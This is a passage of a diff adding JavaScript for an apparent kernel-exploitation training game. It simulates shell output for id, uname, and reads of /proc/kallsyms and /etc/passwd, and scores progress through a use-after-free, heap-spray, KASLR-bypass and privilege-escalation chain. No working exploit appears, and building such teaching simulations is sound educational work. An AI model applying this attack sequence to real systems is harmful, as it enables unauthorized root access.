+      print('uid=0(root) gid=0(root) groups=0(root)', 'success');
+    } else {
+      print('uid=1000(user) gid=1000(user) groups=1000(user)', 'system');
+    }
+    return;
+  }
+
+  if (cmd === 'uname') {
+    print('Linux target 5.15.0-generic #1 SMP x86_64 GNU/Linux', 'system');
+    return;
+  }
+
+  if (cmd === 'cat') {
+    if (args[0] === '/proc/kallsyms') {
+      if (!state.gotRoot) {
+        print('0000000000000000 T _text', 'system');
+        print('0000000000000000 T startup_64', 'system');
+        print('[*] Addresses hidden without root', 'warning');
+      } else {
+        print('ffffffff81000000 T _text', 'success');
+        print('ffffffff810a9c70 T commit_creds', 'success');
+        print('ffffffff810a9f50 T prepare_kernel_cred', 'success');
+      }
+      return;
+    }
+
+    if (args[0] === '/etc/passwd') {
+      print('root:x:0:0:root:/root:/bin/bash', 'system');
+      print('user:x:1000:1000::/home/user:/bin/bash', 'system');
+      return;
+    }
+
+    print(`cat: ${args[0]}: No such file`, 'error');
+    return;
+  }
+
+  print(`${cmd}: command not found`, 'error');
+}
+
+function calculateLevel5Progress(state) {
+  let progress = 0;
+
+  // Recon (15%)
+  if (state.analyzedModule) progress += 5;
+  if (state.foundVuln) progress += 5;
+  if (state.reversedIoctl) progress += 5;
+
+  // Exploitation chain (50%)
+  if (state.allocatedObject) progress += 10;
+  if (state.freedObject) progress += 10;
+  if (state.heapSprayed) progress += 10;
+  if (state.leakedPointer) progress += 10;
+  if (state.calculatedKaslr) progress += 10;
+
+  // Privesc (35%)
+  if (state.overwrotePtr) progress += 10;
+  if (state.triggeredExploit) progress += 10;
+  if (state.gotRoot) progress += 15;
+
+  return Math.min(progress, 100);
+}
+</script>
